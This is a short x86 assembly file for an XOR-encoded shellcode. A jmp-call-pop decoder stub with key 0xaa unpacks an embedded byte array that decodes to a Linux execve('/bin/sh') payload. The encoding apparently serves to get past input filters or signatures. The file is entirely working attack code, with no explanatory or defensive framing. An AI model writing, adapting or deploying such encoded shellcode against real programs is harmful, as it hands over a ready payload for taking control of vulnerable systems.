; Author: rbct

; Shellcode length: 16 bytes without the encoded shellcode

global _start

section .text

_start:

    jmp short CallShellcode

Shellcode:

    pop esi

Decode:

    xor byte [esi], 0xaa
    jz encoded

    inc esi
    jmp short Decode


CallShellcode:

    call Shellcode
    encoded: db 0x9b, 0x6a, 0xfa, 0xc2, 0xc4, 0x85, 0xd9, 0xc2, 0xc2, 0x85, 0x85, 0xc8, 0xc3, 0x1a, 0xa1, 0x23, 0x49, 0x27, 0xe6, 0x8e, 0xa2, 0x27, 0xfe, 0x8e, 0xa2, 0x67, 0x2a, 0xaa
